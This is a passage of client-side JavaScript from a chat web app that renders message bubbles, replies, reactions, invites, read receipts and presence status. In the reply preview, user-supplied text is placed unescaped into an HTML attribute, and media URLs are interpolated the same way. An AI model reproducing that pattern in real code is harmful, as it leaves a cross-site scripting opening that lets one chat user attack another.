        const durationText = formatVoiceDuration(duration);
        const messageId = messageData.id;
        content = `
            <div class="voice-message-player">
                <button class="voice-play-btn-inline" data-voice-id="${messageId}" title="Play voice message">
                    <svg class="voice-play-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <polygon points="5 3 19 12 5 21 5 3"></polygon>
                    </svg>
                </button>
                <div class="voice-progress-inline" data-voice-id="${messageId}">
                    <div class="voice-progress-inline-fill" data-voice-id="${messageId}"></div>
                </div>
                <span class="voice-duration-inline">${durationText}</span>
            </div>
        `;
    } else if (isMediaMessage(messageData)) {
        const mediaClass = messageData.type === 'sticker' ? 'message-sticker' : 'message-image';
        const altLabel = getMediaAltText(messageData.type);

        // For image messages on receiver side, add loading spinner
        if (messageData.type === 'image' && !isOwnMessage) {
            content = `
                <div class="image-loading-container" style="position: relative; display: inline-block;">
                    <img src="${messageData.imgUrl}" class="${mediaClass} loading" alt="${altLabel}" data-image-id="${messageData.id}">
                    <div class="image-loading-overlay" style="display: none;">
                        <div class="image-loading-spinner"></div>
                    </div>
                </div>
            `;
        } else {
            content = `<img src="${messageData.imgUrl}" class="${mediaClass}" alt="${altLabel}">`;
        }
    } else {
        content = `<span class="message-text">${formatMessageText(messageData.text || '')}</span>`;
    }

    let replyHtml = '';
    let hasReply = false;
    if (!isDeleted && messageData.replyTo) {
        hasReply = true;
        const replyName = messageData.replyTo.senderName || 'Unknown';
        const replyText = messageData.replyTo.text || '[Message]';
        const replyMediaUrl = messageData.replyTo.imgUrl;
        const replyType = messageData.replyTo.type;
        const isReplyDeleted = messageData.replyTo.isDeleted || false;

        console.log('Rendering reply context:', {
            replyType,
            replyMediaUrl,
            hasMediaUrl: !!replyMediaUrl,
            isMediaType: replyType === 'image' || replyType === 'sticker' || replyType === 'gif',
            isReplyDeleted
        });

        let mediaIconHtml = '';
        let mediaPreviewHtml = '';
        let displayText = replyText;
        let isMediaReply = false;

        // Handle deleted message edge case
        if (isReplyDeleted) {
            displayText = 'Original message deleted';
        } else {
            // Show thumbnail for images, stickers, and GIFs
            if (replyMediaUrl && (replyType === 'image' || replyType === 'sticker' || replyType === 'gif')) {
                isMediaReply = true;
                mediaPreviewHtml = `
                    <div class="reply-context-media-preview reply-media-only">
                        <img src="${replyMediaUrl}" alt="${replyText}" class="reply-media-thumbnail" onerror="this.style.display='none'">
                    </div>
                `;
                console.log('Media preview HTML created for reply');
            }

            // Add media icon indicator if replying to media
            if (replyType === 'image' || replyType === 'video') {
                const mediaLabel = replyType === 'image' ? 'Photo' : 'Video';
                const mediaIcon = replyType === 'image'
                    ? '<svg class="reply-media-icon" viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5.04-6.71l-2.75-3.54c-.3-.38-.77-.61-1.3-.61-.95 0-1.72.77-1.72 1.72 0 .53.23 1 .61 1.33L6 13h12.9l-4.92-6.29c-.3-.38-.77-.61-1.3-.61-.95 0-1.72.77-1.72 1.72 0 .53.23 1.01.61 1.33z"/></svg>'
                    : '<svg class="reply-media-icon" viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>';
                mediaIconHtml = `<span class="reply-media-label">${mediaIcon} ${mediaLabel}</span>`;
            }
        }

        // For media replies, only show the preview image
        if (isMediaReply) {
            replyHtml = `
                <div class="reply-bubble reply-bubble-media-only" data-reply-to="${messageData.replyTo.messageId}" role="button" tabindex="0" title="Jump to message">
                    ${mediaPreviewHtml}
                </div>
            `;
        } else {
            replyHtml = `
                <div class="reply-bubble" data-reply-to="${messageData.replyTo.messageId}" role="button" tabindex="0" title="Jump to message">
                    ${mediaPreviewHtml}
                    <div class="reply-bubble-content">
                        <div class="reply-bubble-name">${escapeHtml(replyName)}</div>
                        <div class="reply-bubble-text">${escapeHtml(displayText)}</div>
                        ${mediaIconHtml}
                    </div>
                </div>
            `;
        }
    }

    const editedLabel = !isDeleted && messageData.isEdited && !isStickerOrGif ? '<span class="message-edited">(edited)</span>' : '';
    const metaHtml = editedLabel ? `<span class="message-meta">${editedLabel}</span>` : '';

    // Status label removed - sent indicator will be positioned absolutely
    const statusLabel = '';

    let reactionsHtml = '';
    if (!isDeleted && messageData.reactions && messageData.reactions.length > 0) {
        const reactionCounts = {};
        messageData.reactions.forEach(r => {
            reactionCounts[r.emoji] = (reactionCounts[r.emoji] || 0) + 1;
        });
        reactionsHtml = '<div class="message-reactions">';
        for (const [emoji, count] of Object.entries(reactionCounts)) {
            reactionsHtml += `<span class="reaction-badge">${emoji} ${count}</span>`;
        }
        reactionsHtml += '</div>';
    }

    const optionsTrigger = (!isDeleted && isOwnMessage)
        ? '<button class="message-options-trigger">⋯</button>'
        : '';

    // Generate avatar HTML for received messages
    const avatarHtml = !isOwnMessage && !isSystemMessage && !isDeleted
        ? getAvatarHtml(showAvatar, currentChatUser?.photoURL, currentChatUser?.displayName)
        : '';

    // For system messages, render as centered text
    if (isSystemMessage) {
        div.innerHTML = `<div class="system-message-content">${content}</div>`;
    }
    // For stickers and GIFs, render with metadata wrapper
    else if (isStickerOrGif) {
        if (hasReply) {
            // Received messages with avatar, sent messages without
            if (avatarHtml) {
                div.innerHTML = `
                    <div class="message-content-wrapper">
                        ${avatarHtml}
                        <div class="message-group">
                            ${replyHtml}
                            <div class="media-message-wrapper">
                                ${optionsTrigger}
                                ${content}
                                ${reactionsHtml}
                                ${statusLabel}
                            </div>
                        </div>
                    </div>
                `;
            } else {
                div.innerHTML = `
                    <div class="message-group">
                        ${replyHtml}
                        <div class="media-message-wrapper">
                            ${optionsTrigger}
                            ${content}
                            ${reactionsHtml}
                            ${statusLabel}
                        </div>
                    </div>
                `;
            }
        } else {
            // Received messages with avatar, sent messages without
            if (avatarHtml) {
                div.innerHTML = `
                    <div class="message-content-wrapper">
                        ${avatarHtml}
                        <div class="media-message-wrapper">
                            ${optionsTrigger}
                            ${content}
                            ${reactionsHtml}
                            ${statusLabel}
                        </div>
                    </div>
                `;
            } else {
                div.innerHTML = `
                    <div class="media-message-wrapper">
                        ${optionsTrigger}
                        ${content}
                        ${reactionsHtml}
                        ${statusLabel}
                    </div>
                `;
            }
        }
    } else {
        if (hasReply) {
            // Received messages with avatar, sent messages without
            if (avatarHtml) {
                div.innerHTML = `
                    <div class="message-content-wrapper">
                        ${avatarHtml}
                        <div class="message-group">
                            ${replyHtml}
                            <div class="message-bubble">
                                ${optionsTrigger}
                                ${content}
                                ${metaHtml}
                                ${reactionsHtml}
                                ${statusLabel}
                            </div>
                        </div>
                    </div>
                `;
            } else {
                div.innerHTML = `
                    <div class="message-group">
                        ${replyHtml}
                        <div class="message-bubble">
                            ${optionsTrigger}
                            ${content}
                            ${metaHtml}
                            ${reactionsHtml}
                            ${statusLabel}
                        </div>
                    </div>
                `;
            }
        } else {
            // Received messages with avatar, sent messages without
            if (avatarHtml) {
                div.innerHTML = `
                    <div class="message-content-wrapper">
                        ${avatarHtml}
                        <div class="message-bubble">
                            ${optionsTrigger}
                            ${content}
                            ${metaHtml}
                            ${reactionsHtml}
                            ${statusLabel}
                        </div>
                    </div>
                `;
            } else {
                div.innerHTML = `
                    <div class="message-bubble">
                        ${optionsTrigger}
                        ${content}
                        ${metaHtml}
                        ${reactionsHtml}
                        ${statusLabel}
                    </div>
                `;
            }
        }
    }

    if (!isDeleted) {
        const bubble = div.querySelector('.message-bubble');
        const mediaElement = div.querySelector('.message-sticker, .message-image');
        const targetElement = isStickerOrGif ? mediaElement : bubble;
        const isReceivedMessage = !isOwnMessage;

        // Apply theme colors to message bubble
        if (bubble && !isSystemMessage) {
            const theme = chatThemes.get(currentChatId) || getDefaultTheme();
            if (isOwnMessage) {
                bubble.style.backgroundColor = theme.sentBubbleColor;
            } else {
                bubble.style.backgroundColor = theme.receivedBubbleColor;
            }
        }

        if (targetElement) {
            if (isReceivedMessage) {
                targetElement.addEventListener('dblclick', (e) => {
                    showReactionPopup(e, messageData.id);
                });

                targetElement.addEventListener('touchstart', (e) => {
                    longPressTimer = setTimeout(() => {
                        showReactionPopup(e, messageData.id);
                    }, 400);
                });

                targetElement.addEventListener('touchend', () => {
                    clearTimeout(longPressTimer);
                });
            } else {
                // Show options menu for own messages (both text and media)
                // Show options menu for own messages (both text and media)
                let isLongPressTriggered = false;

                targetElement.addEventListener('touchstart', (e) => {
                    // Don't preventDefault here - touch-action: pan-y in CSS handles scrolling
                    // Only set up long-press timer
                    isLongPressTriggered = false;
                    longPressTimer = setTimeout(() => {
                        isLongPressTriggered = true;
                        showMessageOptions(e.touches[0], messageData.id);
                        // Ensure input stays focused if it was focused
                        if (document.activeElement === messageInput) {
                            // Prevent keyboard dismissal
                            // Note: e.preventDefault() here might be too late for some browsers, 
                            // but the key is handling touchend
                        }
                    }, 400);
                });

                targetElement.addEventListener('touchend', (e) => {
                    clearTimeout(longPressTimer);
                    if (isLongPressTriggered) {
                        // Crucial: Prevent the subsequent click event which causes blur
                        e.preventDefault();
                    }
                });

                targetElement.addEventListener('touchmove', () => {
                    clearTimeout(longPressTimer);
                });
            }
        }

        let touchStartX = 0;
        let touchStartY = 0;
        let isSwiping = false;

        div.addEventListener('touchstart', (e) => {
            touchStartX = e.touches[0].clientX;
            touchStartY = e.touches[0].clientY;
            isSwiping = false;
            div.style.transition = 'none';
        });

        div.addEventListener('touchmove', (e) => {
            if (!touchStartX) return;

            const touchX = e.touches[0].clientX;
            const touchY = e.touches[0].clientY;
            const deltaX = touchX - touchStartX;
            const deltaY = touchY - touchStartY;

            // Clear long press timer immediately on any significant movement
            if (Math.abs(deltaX) > 5 || Math.abs(deltaY) > 5) {
                clearTimeout(longPressTimer);
            }

            if (Math.abs(deltaX) > Math.abs(deltaY) && Math.abs(deltaX) > 10) {
                isSwiping = true;

                const maxSwipe = 80;
                let translateX = 0;
                if (isOwnMessage && deltaX < 0) {
                    translateX = Math.max(deltaX, -maxSwipe);
                } else if (!isOwnMessage && deltaX > 0) {
                    translateX = Math.min(deltaX, maxSwipe);
                }

                if (translateX !== 0) {
                    e.preventDefault();
                    div.classList.add('swiping');
                    div.style.transform = `translateX(${translateX}px)`;
                    div.style.opacity = 1 - Math.abs(translateX) / maxSwipe * 0.3;
                }
            }
        });

        div.addEventListener('touchend', (e) => {
            if (!touchStartX || !isSwiping) {
                touchStartX = 0;
                return;
            }

            const touchEndX = e.changedTouches[0].clientX;
            const deltaX = touchEndX - touchStartX;
            const swipeThreshold = 50;

            let shouldReply = false;
            if (isOwnMessage && deltaX < -swipeThreshold) {
                shouldReply = true;
            } else if (!isOwnMessage && deltaX > swipeThreshold) {
                shouldReply = true;
            }

            if (shouldReply) {
                triggerSwipeReply(messageData);
            }

            div.style.transition = 'transform 0.2s ease, opacity 0.2s ease';
            div.style.transform = 'translateX(0)';
            div.style.opacity = '1';
            div.classList.remove('swiping');

            touchStartX = 0;
            isSwiping = false;
        });

        const optionsBtn = div.querySelector('.message-options-trigger');
        if (optionsBtn) {
            optionsBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                showMessageOptions(e, messageData.id);
            });
        }

        const replyBubble = div.querySelector('.reply-bubble');
        if (replyBubble) {
            const jumpToSource = () => {
                const toId = replyBubble.getAttribute('data-reply-to');
                const target = document.querySelector(`.message[data-message-id="${toId}"]`);
                if (target) {
                    // Smooth scroll to the source message
                    target.scrollIntoView({ behavior: 'smooth', block: 'center' });

                    // Add highlight animation
                    target.classList.add('highlight-replied');

                    // Remove highlight after animation completes
                    setTimeout(() => target.classList.remove('highlight-replied'), 1500);
                } else {
                    // Message not found - could be deleted or not loaded
                    console.warn('Source message not found:', toId);
                }
            };

            // Click handler
            replyBubble.addEventListener('click', jumpToSource);

            // Keyboard support (Enter and Space)
            replyBubble.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    jumpToSource();
                }
            });
        }

        if (isMediaMessage(messageData) && messageData.imgUrl) {
            const mediaEl = div.querySelector('.message-image, .message-sticker');
            if (mediaEl) {
                mediaEl.addEventListener('click', (e) => {
                    e.stopPropagation();
                    // Only open full-screen viewer for images, not stickers
                    if (messageData.type === 'image') {
                        openImageViewer(messageData.imgUrl);
                    } else if (messageData.type === 'sticker' || messageData.type === 'gif') {
                        // For stickers and GIFs, show context menu instead
                        showMessageOptions(e, messageData.id);
                    }
                });

                // Handle receiver-side image loading spinner
                if (messageData.type === 'image' && !isOwnMessage) {
                    const loadingOverlay = div.querySelector('.image-loading-overlay');
                    if (loadingOverlay && mediaEl) {
                        // Show spinner initially
                        loadingOverlay.style.display = 'flex';

                        // Hide spinner when image loads
                        mediaEl.addEventListener('load', () => {
                            loadingOverlay.style.display = 'none';
                            mediaEl.classList.remove('loading');
                            mediaEl.classList.add('loaded');
                            // Scroll to bottom after image loads to show complete message
                            scrollToBottom(false);
                        });

                        // Hide spinner on error too
                        mediaEl.addEventListener('error', () => {
                            loadingOverlay.style.display = 'none';
                            mediaEl.classList.remove('loading');
                            // Scroll to bottom even on error
                            scrollToBottom(false);
                        });

                        // If image is already cached/loaded, hide spinner
                        if (mediaEl.complete) {
                            loadingOverlay.style.display = 'none';
                            mediaEl.classList.remove('loading');
                            mediaEl.classList.add('loaded');
                            // Scroll to bottom for cached images
                            scrollToBottom(false);
                        }
                    }
                }
            }
        }

        // Handle game invite button click
        if (isGameInvite) {
            const gameInviteBtn = div.querySelector('.game-invite-btn');
            if (gameInviteBtn && !gameInviteBtn.classList.contains('expired')) {
                gameInviteBtn.addEventListener('click', async (e) => {
                    e.preventDefault();
                    const roomId = gameInviteBtn.dataset.roomId;
                    const gameType = gameInviteBtn.dataset.gameType || 'tictactoe';

                    if (roomId) {
                        try {
                            // Mark the game invite as started/expired in Firestore
                            const messageRef = doc(db, 'chats', currentChatId, 'messages', messageData.id);
                            await updateDoc(messageRef, {
                                gameStarted: true,
                                joinedAt: serverTimestamp()
                            });

                            // Update button to show expired state
                            gameInviteBtn.textContent = 'Invite Expired';
                            gameInviteBtn.disabled = true;
                            gameInviteBtn.classList.add('expired');

                            // Determine which game file to use
                            const gameFile = gameType === 'rps' ? 'rps.html' : 'games.html';
                            window.location.href = `${gameFile}?roomId=${roomId}&mode=join&chatId=${currentChatId}`;
                        } catch (error) {
                            console.error('Error marking game as started:', error);
                        }
                    }
                });
            }
        }

        if (isWatchPartyInvite) {
            const watchPartyBtn = div.querySelector('.watch-party-btn');
            if (watchPartyBtn && !watchPartyBtn.classList.contains('expired')) {
                watchPartyBtn.addEventListener('click', async (e) => {
                    e.preventDefault();
                    const roomId = watchPartyBtn.dataset.roomId;
                    if (!roomId) return;

                    try {
                        // Refresh message to ensure it's still active
                        if (messageData.id) {
                            const messageRef = doc(db, 'chats', currentChatId, 'messages', messageData.id);
                            await updateDoc(messageRef, {
                                partyEnded: false,
                                updatedAt: serverTimestamp()
                            });
                        }
                    } catch (error) {
                        console.warn('Unable to update watch party message:', error);
                    }

                    const joinMode = isOwnMessage ? 'host' : 'guest';
                    window.location.href = `watch.html?roomId=${roomId}&mode=${joinMode}&chatId=${currentChatId}`;
                });
            }
        }

        // Voice message playback
        if (messageData.type === 'voice' && messageData.voiceUrl) {
            const playBtn = div.querySelector('.voice-play-btn-inline');
            const progressBar = div.querySelector('.voice-progress-inline');
            if (playBtn) {
                playBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    toggleVoicePlayback(messageData.id, messageData.voiceUrl, playBtn, progressBar);
                });
            }
            if (progressBar) {
                progressBar.addEventListener('click', (e) => {
                    e.stopPropagation();
                    seekVoiceMessage(messageData.id, messageData.voiceUrl, e, progressBar);
                });
            }
        }
    }

    return div;
}

function scrollToBottom(smooth = false) {
    if (!messagesContainer) return;

    // Use multiple requestAnimationFrames to ensure DOM is fully updated
    requestAnimationFrame(() => {
        requestAnimationFrame(() => {
            try {
                if (smooth) {
                    messagesContainer.scrollTo({
                        top: messagesContainer.scrollHeight,
                        behavior: 'smooth'
                    });
                } else {
                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
                }
            } catch (error) {
                console.error('Error scrolling to bottom:', error);
            }
        });
    });
}

function appendMessage(messageData) {
    const messageEl = createMessageElement(messageData);
    // Use requestAnimationFrame to prevent layout thrashing
    requestAnimationFrame(() => {
        // Insert message in correct chronological order based on timestamp
        const existingMessages = messagesContainer.querySelectorAll('.message');
        let inserted = false;

        // Extract new message timestamp using same logic as createMessageElement
        let newTimestamp = 0;
        if (messageData.timestamp?.seconds) {
            newTimestamp = messageData.timestamp.seconds * 1000;
        } else if (messageData.timestamp instanceof Date) {
            newTimestamp = messageData.timestamp.getTime();
        } else {
            // Fallback to current time for messages that haven't been synced yet
            newTimestamp = Date.now();
        }

        for (let i = 0; i < existingMessages.length; i++) {
            const existingMsg = existingMessages[i];
            const existingTimestamp = parseInt(existingMsg.dataset.timestamp || '0');

            if (newTimestamp < existingTimestamp) {
                messagesContainer.insertBefore(messageEl, existingMsg);
                inserted = true;
                break;
            }
        }

        // If not inserted yet, append to end
        if (!inserted) {
            messagesContainer.appendChild(messageEl);
        }

        updateMessageStatusVisibility();
        // Auto-scroll to bottom when new message is added
        scrollToBottom(true);
    });
}

function updateMessage(messageId, messageData) {
    const messageEl = document.querySelector(`.message[data-message-id="${messageId}"]`);
    if (!messageEl) return;

    const isOwnMessage = messageData.senderId === currentUser.uid;
    const isDeleted = !!messageData.isDeleted;
    const isGameInvite = messageData.type === 'game_invite';
    const isWatchPartyInvite = messageData.type === 'watch_party';

    // If message is deleted or content changed significantly, replace entire element
    if (isDeleted || messageEl.classList.contains('deleted') !== isDeleted) {
        const mergedData = { id: messageId, ...messageData };
        const newEl = createMessageElement(mergedData);
        messagesContainer.replaceChild(newEl, messageEl);
        updateMessageStatusVisibility();
        return;
    }

    if (isWatchPartyInvite) {
        const mergedData = { id: messageId, ...messageData };
        const newEl = createMessageElement(mergedData);
        messagesContainer.replaceChild(newEl, messageEl);
        updateMessageStatusVisibility();
        return;
    }

    // Handle game invite expiration
    if (isGameInvite && messageData.gameStarted) {
        const gameInviteBtn = messageEl.querySelector('.game-invite-btn');
        if (gameInviteBtn && !gameInviteBtn.classList.contains('expired')) {
            // Update button to expired state
            gameInviteBtn.textContent = 'Invite Expired';
            gameInviteBtn.disabled = true;
            gameInviteBtn.classList.add('expired');
            gameInviteBtn.removeAttribute('data-room-id');
            gameInviteBtn.removeAttribute('data-game-type');
        }
        return;
    }

    // Use requestAnimationFrame to batch DOM updates and prevent flickering
    requestAnimationFrame(() => {
        // Update seen status dataset
        messageEl.dataset.seen = messageData.seen ? 'true' : 'false';

        // Update message text if it changed
        const messageTextEl = messageEl.querySelector('.message-text');
        if (messageTextEl && messageData.text) {
            messageTextEl.innerHTML = formatMessageText(messageData.text);
        }

        // Update edited label (allow multiple edits)
        const metaEl = messageEl.querySelector('.message-meta');
        if (messageData.isEdited) {
            if (metaEl) {
                // Label already exists, just ensure it's visible
                metaEl.style.display = 'block';
            } else {
                // Create new edited label
                const bubble = messageEl.querySelector('.message-bubble');
                const editedSpan = document.createElement('span');
                editedSpan.className = 'message-meta';
                editedSpan.innerHTML = '<span class="message-edited">(edited)</span>';
                const statusEl = bubble.querySelector('.message-status');
                if (statusEl) {
                    bubble.insertBefore(editedSpan, statusEl);
                } else {
                    bubble.appendChild(editedSpan);
                }
            }
        }

        // Update reactions
        const reactionsContainer = messageEl.querySelector('.message-reactions');
        if (messageData.reactions && messageData.reactions.length > 0) {
            const reactionCounts = {};
            messageData.reactions.forEach(r => {
                reactionCounts[r.emoji] = (reactionCounts[r.emoji] || 0) + 1;
            });
            let reactionsHtml = '';
            for (const [emoji, count] of Object.entries(reactionCounts)) {
                reactionsHtml += `<span class="reaction-badge">${emoji} ${count}</span>`;
            }

            if (reactionsContainer) {
                reactionsContainer.innerHTML = reactionsHtml;
            } else {
                const bubble = messageEl.querySelector('.message-bubble');
                const newReactionsDiv = document.createElement('div');
                newReactionsDiv.className = 'message-reactions';
                newReactionsDiv.innerHTML = reactionsHtml;
                bubble.appendChild(newReactionsDiv);
            }
        } else if (reactionsContainer) {
            reactionsContainer.remove();
        }

        updateMessageStatusVisibility();
    });
}

function removeMessage(messageId) {
    const messageEl = document.querySelector(`.message[data-message-id="${messageId}"]`);
    if (messageEl) {
        messageEl.remove();
    }
    updateMessageStatusVisibility();
}

function updateMessageStatusVisibility() {
    const sentMessages = Array.from(messagesContainer.querySelectorAll('.message.sent'));

    // Find the last message where seen: true
    let lastSeenMessageEl = null;
    for (let i = sentMessages.length - 1; i >= 0; i--) {
        const messageEl = sentMessages[i];
        if (messageEl.dataset.seen === 'true') {
            lastSeenMessageEl = messageEl;
            break;
        }
    }

    // Remove all floating receipts and sent indicators first
    sentMessages.forEach((messageEl) => {
        const floatingReceipt = messageEl.querySelector('.read-receipt-floating');
        if (floatingReceipt) {
            floatingReceipt.remove();
        }
        const sentIndicator = messageEl.querySelector('.sent-indicator-floating');
        if (sentIndicator) {
            sentIndicator.remove();
        }
    });

    // Add floating receipt to the last seen message only
    if (lastSeenMessageEl) {
        const existingReceipt = lastSeenMessageEl.querySelector('.read-receipt-floating');
        if (!existingReceipt) {
            const floatingReceipt = createFloatingReceipt();
            lastSeenMessageEl.appendChild(floatingReceipt);
        }
    }

    // Add "Sent" indicator to the last unseen message
    let lastUnseenMessageEl = null;
    let lastUnseenMessageData = null;
    for (let i = sentMessages.length - 1; i >= 0; i--) {
        const messageEl = sentMessages[i];
        if (messageEl.dataset.seen === 'false') {
            lastUnseenMessageEl = messageEl;
            // Get message data from the message element's data attributes or reconstruct it
            lastUnseenMessageData = {
                timestamp: {
                    seconds: parseInt(messageEl.dataset.timestamp) / 1000
                }
            };
            break;
        }
    }

    if (lastUnseenMessageEl) {
        const existingSentIndicator = lastUnseenMessageEl.querySelector('.sent-indicator-floating');
        if (!existingSentIndicator) {
            const sentIndicator = createSentIndicator(lastUnseenMessageData);
            lastUnseenMessageEl.appendChild(sentIndicator);
        }
    }

    // Start periodic update for sent indicators
    startSentIndicatorUpdates();
}

function startSentIndicatorUpdates() {
    // Clear existing interval if any
    if (sentIndicatorUpdateInterval) {
        clearInterval(sentIndicatorUpdateInterval);
    }

    // Update every 30 seconds to refresh the time display
    sentIndicatorUpdateInterval = setInterval(() => {
        const sentIndicators = document.querySelectorAll('.sent-indicator-floating');
        sentIndicators.forEach((indicator) => {
            const messageEl = indicator.closest('.message');
            if (messageEl && messageEl.dataset.timestamp) {
                const messageTime = parseInt(messageEl.dataset.timestamp);
                const now = Date.now();
                const elapsedMs = now - messageTime;
                const elapsedSeconds = Math.floor(elapsedMs / 1000);
                const elapsedMinutes = Math.floor(elapsedSeconds / 60);
                const elapsedHours = Math.floor(elapsedMinutes / 60);
                const elapsedDays = Math.floor(elapsedHours / 24);

                let timeText = 'Sent';
                if (elapsedSeconds < 60) {
                    timeText = 'Sent now';
                } else if (elapsedMinutes < 60) {
                    timeText = `Sent ${elapsedMinutes}m ago`;
                } else if (elapsedHours < 24) {
                    timeText = `Sent ${elapsedHours}h ago`;
                } else {
                    timeText = `Sent ${elapsedDays}d ago`;
                }

                indicator.textContent = timeText;
            }
        });
    }, 30000); // Update every 30 seconds
}

function createFloatingReceipt() {
    const div = document.createElement('div');
    div.className = 'read-receipt-floating';

    if (currentChatUser?.photoURL) {
        const img = document.createElement('img');
        img.src = currentChatUser.photoURL;
        img.alt = 'Seen';
        img.className = 'read-receipt-floating-avatar';
        img.title = 'Seen';
        div.appendChild(img);
    } else {
        // Fallback to initials
        const initialsDiv = document.createElement('div');
        initialsDiv.className = 'read-receipt-floating-initials';
        const initials = (currentChatUser?.displayName || 'U').split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
        initialsDiv.textContent = initials;
        div.appendChild(initialsDiv);
    }

    return div;
}

function createSentIndicator(messageData) {
    const div = document.createElement('div');
    div.className = 'sent-indicator-floating';

    // Get time elapsed since message was sent
    let timeText = 'Sent';
    if (messageData && messageData.timestamp) {
        const messageTime = messageData.timestamp.seconds
            ? messageData.timestamp.seconds * 1000
            : messageData.timestamp instanceof Date
                ? messageData.timestamp.getTime()
                : Date.now();

        const now = Date.now();
        const elapsedMs = now - messageTime;
        const elapsedSeconds = Math.floor(elapsedMs / 1000);
        const elapsedMinutes = Math.floor(elapsedSeconds / 60);
        const elapsedHours = Math.floor(elapsedMinutes / 60);
        const elapsedDays = Math.floor(elapsedHours / 24);

        if (elapsedSeconds < 60) {
            timeText = 'Sent now';
        } else if (elapsedMinutes < 60) {
            timeText = `Sent ${elapsedMinutes}m ago`;
        } else if (elapsedHours < 24) {
            timeText = `Sent ${elapsedHours}h ago`;
        } else {
            timeText = `Sent ${elapsedDays}d ago`;
        }
    }

    div.textContent = timeText;
    return div;
}

function getStatusText(messageData) {
    // Return only checkmark for unsent messages
    // Floating receipt is handled separately via updateMessageStatusVisibility
    return `<div class="message-status-sent">✓</div>`;
}

function getDisplayStatus(userData) {
    if (!userData) return 'offline';
    const lastActive = userData.lastActive?.toDate
        ? userData.lastActive.toDate()
        : userData.lastActive
            ? new Date(userData.lastActive)
            : null;
    if (lastActive) {
        const isRecentlyActive = (Date.now() - lastActive.getTime()) < PRESENCE_TIMEOUT;
        return isRecentlyActive ? 'online' : 'offline';
    }
    return userData.status === 'online' ? 'online' : 'offline';
}

function getChatHeaderStatus(userData) {
    if (!userData) return 'offline';

    const lastActive = userData.lastActive?.toDate
        ? userData.lastActive.toDate()
        : userData.lastActive
            ? new Date(userData.lastActive)
            : null;

    // Check if user is currently online
    if (lastActive) {
        const isRecentlyActive = (Date.now() - lastActive.getTime()) < PRESENCE_TIMEOUT;
        if (isRecentlyActive) {
            return 'Online';
        }
    } else if (userData.status === 'online') {
        return 'Online';
    }

    // User is offline - show relative time
    if (lastActive) {
        const now = new Date();
        const diff = now - lastActive;

        if (diff < 60000) return 'Active just now';
        if (diff < 3600000) return `Active ${Math.floor(diff / 60000)}m ago`;
        if (diff < 86400000) {
            const hours = Math.floor(diff / 3600000);
            return `Active ${hours}h ago`;
        }
        if (diff < 604800000) {
            const days = Math.floor(diff / 86400000);
            return days === 1 ? 'Active yesterday' : `Active ${days}d ago`;
        }
        // For older timestamps, show the date
        return `Active ${lastActive.toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}`;
    }

    return 'offline';
}

function renderCurrentUserProfile() {
    if (!currentUserNameEl) return;

    if (!currentUserData) {
        currentUserNameEl.textContent = 'You';
        currentUserEmailEl.textContent = '';
        currentUserTaglineEl && (currentUserTaglineEl.textContent = 'Add a status');
        applyAvatarToElement(currentUserAvatarEl, null, 'You');
        currentUserStatusEl.textContent = 'offline';
        currentUserStatusEl.classList.add('offline');
        currentUserIndicatorEl?.classList.add('hidden');
        return;
    }

    currentUserNameEl.textContent = currentUserData.displayName || 'You';
    currentUserEmailEl.textContent = currentUserData.email || currentUser?.email || '';
    currentUserTaglineEl && (currentUserTaglineEl.textContent = currentUserData.statusMessage || 'Add a status');
    applyAvatarToElement(currentUserAvatarEl, currentUserData.photoURL, currentUserData.displayName || currentUserData.email);

    const statusText = getDisplayStatus(currentUserData);
    currentUserStatusEl.textContent = statusText;
    if (statusText === 'online') {
        currentUserStatusEl.classList.remove('offline');
    } else {
        currentUserStatusEl.classList.add('offline');
    }
    if (statusText === 'online') {
        currentUserIndicatorEl?.classList.remove('hidden');
    } else {
        currentUserIndicatorEl?.classList.add('hidden');
    }
}

async function updateUserPresence(status) {
    if (!currentUser) return;
    try {
        await updateDoc(doc(db, 'users', currentUser.uid), {
            status,
            lastActive: serverTimestamp()
        });
    } catch (error) {
        console.error('Error updating presence:', error);
    }
}

function startPresenceTracking() {
    stopPresenceTracking();
    updateUserPresence('online');
    presenceInterval = setInterval(() => {
        updateUserPresence('online');
    }, PRESENCE_UPDATE_INTERVAL);
}

function stopPresenceTracking() {
    if (presenceInterval) {
        clearInterval(presenceInterval);
        presenceInterval = null;
    }
}

// ===========================
// Window Focus/Blur Events (Tab Active/Inactive)
// ===========================
window.addEventListener('focus', () => {
    if (!currentUser) return;
    // User focused on tab - set online
    startPresenceTracking();
});

window.addEventListener('blur', () => {
    if (!currentUser) return;
    // User switched away from tab - set offline immediately
    stopPresenceTracking();
    updateUserPresence('offline');
});

// ===========================
// Document Visibility Change (Tab Hidden/Visible)
// ===========================
document.addEventListener('visibilitychange', () => {
    if (!currentUser) return;
    if (document.visibilityState === 'hidden') {
        // Tab is hidden - set offline
        stopPresenceTracking();
        updateUserPresence('offline');
    } else {
        // Tab is visible - set online
        startPresenceTracking();
    }
});

// ===========================
// Page Unload (Tab Closed)
// ===========================
window.addEventListener('beforeunload', () => {
    if (!currentUser) return;
    // User closing tab - set offline
    updateUserPresence('offline');
});

function listenToCurrentUser(uid) {
    if (unsubscribeCurrentUser) {
        unsubscribeCurrentUser();
    }
    const userRef = doc(db, 'users', uid);
    unsubscribeCurrentUser = onSnapshot(userRef, (snapshot) => {
        if (snapshot.exists()) {
            currentUserData = snapshot.data();
            renderCurrentUserProfile();
            maybeShowFloatingPersonaFromUserData(currentUserData);
        }
    }, (error) => {
        // Suppress permission errors during logout
        if (error.code === 'permission-denied') {
            console.debug('Permission denied (expected during logout)');
        } else {
            console.error('Error listening to current user:', error);
        }
    });
}

// ===========================
// Stories
// ===========================
function handleStoryFileChange(event) {
    const file = event.target.files[0];
    if (!file || !currentUser || storyUploadInProgress) return;
    uploadStory(file);
}

async function uploadStory(file) {
    try {
        storyUploadInProgress = true;
        setStoryUploadState(true);

        // Detect media type
